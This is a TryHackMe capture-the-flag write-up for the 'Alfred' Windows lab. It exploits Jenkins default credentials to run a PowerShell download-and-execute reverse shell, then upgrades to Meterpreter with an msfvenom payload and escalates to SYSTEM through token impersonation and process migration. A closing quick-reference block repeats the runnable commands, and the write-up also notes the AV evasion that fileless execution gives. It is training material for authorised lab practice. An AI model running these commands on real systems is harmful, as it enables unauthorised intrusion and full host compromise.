# THM — Alfred

> **Platform:** TryHackMe  
> **Difficulty:** Medium  
> **OS:** Windows  
> **Tags:** `#thm` `#windows` `#jenkins` `#rce` `#powershell` `#meterpreter` `#token-impersonation` `#incognito` `#privesc`

---

## Kill Chain Summary

```
Nmap Scan → Jenkins Default Credentials → RCE via Build Step (Nishang Cradle)
→ Netcat Shell → Meterpreter Upgrade → Token Impersonation (Incognito)
→ Process Migration (services.exe) → NT AUTHORITY\SYSTEM
```

---

## 1. Reconnaissance — Nmap Scan

The target does not respond to ICMP (ping), so host discovery must be disabled explicitly.

**Command:**

```bash
nmap -Pn -p- -T4 -vv <TARGET_IP>
```

**Flag breakdown:**

| Flag | Purpose |
|------|---------|
| `-Pn` | Skip ping check — treat host as online. Essential for firewalled Windows targets |
| `-p-` | Scan all 65535 ports — prevents missing services on non-standard ports |
| `-T4` | Aggressive timing for faster results |
| `-vv` | Verbose output to see open ports as they are discovered |

**Key results:**

| Port | State | Service | Notes |
|------|-------|---------|-------|
| 80/tcp | open | HTTP | Microsoft IIS |
| 3389/tcp | open | RDP | Microsoft Terminal Services |
| 8080/tcp | open | HTTP | Jetty — Jenkins Automation Server |

---

## 2. Web Enumeration — Jenkins Panel

Navigating to `http://<TARGET_IP>:8080` reveals a Jenkins login page.

**Credentials tested:** `admin:admin` (factory defaults)

✅ Login successful — administrator access granted.

> ⚠️ **Finding:** Jenkins instance accessible on a non-standard port with default credentials unchanged. Jenkins running as administrator on a Windows host is a critical misconfiguration — the Build pipeline has direct access to Windows batch and PowerShell execution.

---

## 3. Initial Access — RCE via Jenkins Build Step

Jenkins provides a **Build** feature that executes arbitrary system commands. We abuse this to deliver a fileless PowerShell reverse shell using the **Nishang** framework (`Invoke-PowerShellTcp.ps1`).

### Step 1 — Host the payload (Kali)

From the directory containing `Invoke-PowerShellTcp.ps1`:

```bash
python3 -m http.server 80
```

### Step 2 — Start the listener (Kali, new terminal)

```bash
nc -lvnp 4444
```

### Step 3 — Build the PowerShell cradle

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://<KALI_VPN_IP>:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <KALI_VPN_IP> -Port 4444
```

**Command breakdown:**

| Component | Role |
|-----------|------|
| `iex` | Invoke-Expression — executes the downloaded string as code |
| `New-Object Net.WebClient` | Creates an HTTP client object |
| `.DownloadString(...)` | Downloads the script **into RAM** without writing to disk (fileless execution) |
| `Invoke-PowerShellTcp` | Calls the reverse shell function from the Nishang script |

### Step 4 — Inject and trigger via Jenkins

1. **New Item** → **Freestyle project**
2. Scroll to **Build** → **Add build step** → **Execute Windows batch command**
3. Paste the PowerShell cradle
4. **Save** → **Build Now**

✅ Reverse shell received on the Netcat listener.

---

## 4. User Flag

```powershell
whoami
# alfred\bruce

cd C:\Users\bruce\Desktop
type user.txt
```

> 💡 **OPSEC Reminder:** Always set `LHOST` / `IPAddress` to the `tun0` VPN IP. The target machine routes outbound traffic through the VPN tunnel — specifying a local VM IP (`192.168.x.x`) will result in a failed callback.

---

## 5. Shell Upgrade — Netcat to Meterpreter

The initial Netcat shell is unstable and lacks the capabilities needed for token impersonation. We upgrade to a Meterpreter session.

### Step 1 — Generate the payload (Kali)

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  -a x86 \
  --encoder x86/shikata_ga_nai \
  LHOST=<KALI_VPN_IP> \
  LPORT=5555 \
  -f exe \
  -o shell-name.exe
```

### Step 2 — Configure the handler (Metasploit)

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 5555
run
```

### Step 3 — Transfer and execute (from the Netcat shell)

Ensure the Python HTTP server is still running on Kali.

```powershell
# Download
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<KALI_VPN_IP>/shell-name.exe','shell-name.exe')"

# Execute
Start-Process "shell-name.exe"
```

✅ Meterpreter session opened.

---

## 6. Privilege Escalation — Token Impersonation (Incognito)

Windows uses **access tokens** to track the identity and privileges of running processes. If a privileged token is present in memory and our user holds `SeImpersonatePrivilege`, we can steal that token and assume the identity of a higher-privileged account.

### Step 1 — Check available privileges

```bash
getprivs
```

Look for:
- `SeDebugPrivilege` — allows attaching to and reading any process
- `SeImpersonatePrivilege` — allows impersonating any token available in memory

Both present → privilege escalation is viable.

### Step 2 — Load the Incognito module

```bash
load incognito
```

### Step 3 — Enumerate and steal a token

```bash
# List available tokens by group
list_tokens -g

# Impersonate the Administrator token
impersonate_token "BUILTIN\Administrators"
```

### Step 4 — Verify identity

```bash
getuid
# NT AUTHORITY\SYSTEM
```

✅ Token stolen — running as SYSTEM.

---

## 7. Process Migration — Stabilisation

Although we hold a SYSTEM token, our host process (`shell-name.exe`) is still running in the context of the original unprivileged user. We need to migrate into a stable, legitimately privileged process to make the session persistent and reliable.

**Target process:** `services.exe` — always runs as SYSTEM and is one of the most stable processes on Windows.

```bash
# List running processes
ps

# Identify the PID of services.exe (e.g. 668)
# Migrate into it
migrate <PID>
```

✅ Migration successful — full, stable SYSTEM control achieved.

---

## 8. Root Flag

```bash
cat C:/Windows/System32/config/root.txt
```

---

## 9. Vulnerability Summary

| # | Finding | Severity | Detail |
|---|---------|----------|--------|
| 1 | Jenkins default credentials | 🔴 Critical | `admin:admin` grants full administrator access to the automation server |
| 2 | RCE via Jenkins Build pipeline | 🔴 Critical | Authenticated users can execute arbitrary OS commands through Build steps |
| 3 | Jenkins exposed on network | 🟡 Medium | Port 8080 reachable without network-level access controls |
| 4 | SeImpersonatePrivilege enabled | 🔴 High | Allows token theft and identity escalation to SYSTEM |
| 5 | Privileged tokens in memory | 🔴 High | SYSTEM-level tokens available for impersonation via Incognito |

---

## 10. Key Takeaways

- **Default credentials are still widespread:** `admin:admin` on Jenkins is a known default that should be the first thing tested on any automation panel. Credential hardening must be part of every deployment checklist.
- **Fileless execution evades disk-based AV:** The PowerShell cradle using `.DownloadString()` never writes the Nishang script to disk — it executes entirely in memory, bypassing signature-based detections that scan the filesystem.
- **`-Pn` is essential for Windows targets:** Windows hosts commonly drop ICMP by default. Without `-Pn`, Nmap marks them as offline and skips scanning entirely.
- **Token Impersonation is a Windows-specific privesc class:** `SeImpersonatePrivilege` is assigned by default to service accounts and IIS application pools. Any service compromise on Windows that yields this privilege is a direct path to SYSTEM.
- **Process migration solidifies access:** Holding a stolen token is not enough — migrating into `services.exe` binds the session to a stable, SYSTEM-owned process, making it resilient to the original payload being terminated.

---

## Quick Reference — Key Commands

```bash
# Recon
nmap -Pn -p- -T4 -vv <TARGET_IP>

# Listener (Netcat)
nc -lvnp 4444

# Python HTTP server
python3 -m http.server 80

# PowerShell cradle (Jenkins Build step)
powershell iex (New-Object Net.WebClient).DownloadString('http://<KALI_IP>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <KALI_IP> -Port 4444

# Meterpreter payload
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<IP> LPORT=5555 -f exe -o shell-name.exe

# Download on target
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<IP>/shell-name.exe','shell-name.exe')"
Start-Process "shell-name.exe"

# Meterpreter - token impersonation
getprivs
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
getuid

# Process migration
ps
migrate <PID_of_services.exe>

# Root flag
cat C:/Windows/System32/config/root.txt
```

---

*Writeup completed on 30/03/2026 — TryHackMe / Alfred*
